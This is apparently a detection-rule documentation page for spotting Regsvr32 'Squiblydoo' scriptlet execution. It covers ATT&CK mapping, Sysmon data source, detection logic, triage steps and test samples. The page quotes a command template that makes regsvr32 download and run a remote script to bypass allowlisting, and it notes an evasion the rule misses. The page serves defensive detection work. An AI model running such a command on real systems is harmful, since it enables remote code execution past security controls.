# UC-06: Regsvr32 loading a script component (Squiblydoo)

| | |
| --- | --- |
| Rule | [`rules/windows/uc06_regsvr32_scriptlet.yml`](../../rules/windows/uc06_regsvr32_scriptlet.yml) |
| Splunk | [`queries/splunk/uc06_regsvr32_scriptlet.spl`](../../queries/splunk/uc06_regsvr32_scriptlet.spl) |
| ATT&CK | Stealth, T1218.010 System Binary Proxy Execution: Regsvr32 (ATT&CK v20) |
| Severity | high |

## Why it matters

`regsvr32 /s /n /u /i:http://.../file.sct scrobj.dll` makes a signed Windows binary download and run a script. It bypasses application allowlisting because the process is trusted.

## Data source

- Sysmon event 1 (process creation) with `OriginalFileName` (Sysmon 10 or newer).

## Logic

The process is `regsvr32.exe` (by path or by `OriginalFileName`, which catches renamed copies) and the command line contains both `/i:` and `scrobj`.

## False positives and tuning

- None expected. Legitimate software does not register COM scriptlets this way.

## Triage

1. What does `/i:` point to? A URL means a download; record it as an indicator.
2. What is the parent process (Office, browser, script)?
3. Look for network connections and child processes from `regsvr32.exe`.

## Test evidence

Attack sample `Execution/exec_sysmon_lobin_regsvr32_sct.evtx`.

## Limitations

- The sample `exec_sysmon_1_lolbin_renamed_regsvr32_scrobj.evtx` is missed: it uses a renamed `regsvr32` on an old Sysmon without `OriginalFileName`, and does not pass `scrobj` on the command line.
